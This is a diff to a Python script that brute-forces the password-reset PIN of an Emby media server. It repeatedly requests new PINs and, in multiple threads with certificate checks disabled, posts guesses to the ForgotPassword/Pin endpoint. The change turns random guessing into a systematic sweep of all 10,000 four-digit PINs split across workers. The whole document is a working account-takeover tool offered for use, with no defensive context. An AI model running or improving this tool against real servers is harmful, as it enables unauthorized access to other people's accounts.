@@ -4,10 +4,12 @@ import random
 import threading
 from concurrent.futures import ThreadPoolExecutor
 
-host = ''
+
 
 found_event = threading.Event()
 lock = threading.Lock()
+
+host = ''
 foo = ''
 
 def generate_pin():
@@ -15,13 +17,13 @@ def generate_pin():
     headers = {'Content-Type': 'application/json'}
     try:
         resp = requests.post(url, headers=headers, verify=False, timeout=5)
+        print("return:",resp.content)
         return resp.status_code == 200
     except Exception:
         return False
 
 
-def try_single_pin(session, timeout=3):
-    random_pin = random.randint(0, 9999)
+def try_single_pin(session, timeout=3,random_pin=0):
     pin = str(random_pin).zfill(4)
     print(f"Try with random PIN: {pin}")
     url = f'{host.rstrip("/")}/emby/Users/ForgotPassword/Pin'
@@ -47,33 +49,41 @@ def try_single_pin(session, timeout=3):
     return False
 
 
-def get_pin_loop(timeout, sleep_between):
+def get_pin_loop(timeout, sleep_between,pin_begin,pin_end):
 
     session = requests.Session()
     session.headers.update({'Content-Type': 'application/json'})
 
     while not found_event.is_set():
-        ok = generate_pin()
-        if not ok:
-            time.sleep(sleep_between)
-            continue
+        for pin in range(pin_begin, pin_end + 1):
+            ok = generate_pin()
+            if not ok:
+                time.sleep(sleep_between)
+                continue
 
-        attempted = try_single_pin(session, timeout=timeout)
-        if attempted:
-            with lock:
-                found_event.set()
-            break
-        time.sleep(sleep_between)
+            attempted = try_single_pin(session, timeout=timeout,random_pin=pin)
+            if attempted:
+                with lock:
+                    found_event.set()
+                break
+            time.sleep(sleep_between)
 
     session.close()
 
 
 def get_pin(workers, timeout,sleep_between):
+    total_pins = 10000
+    chunk_size = total_pins // workers
     with ThreadPoolExecutor(max_workers=workers) as executor:
-        futures = [executor.submit(get_pin_loop, timeout,sleep_between) for _ in range(workers)]
+        futures = []
+        for i in range(workers):
+            start = i * chunk_size
+            end = (start + chunk_size - 1) if i < workers - 1 else 9999
+            futures.append(executor.submit(get_pin_loop, timeout, sleep_between, start, end))
         for f in futures:
             f.result()
 
 if __name__ == "__main__":
-    get_pin(workers=20, timeout=3,sleep_between=0.2)
+    host = ''
+    get_pin(workers=5, timeout=3,sleep_between=0.2)
     print(foo)
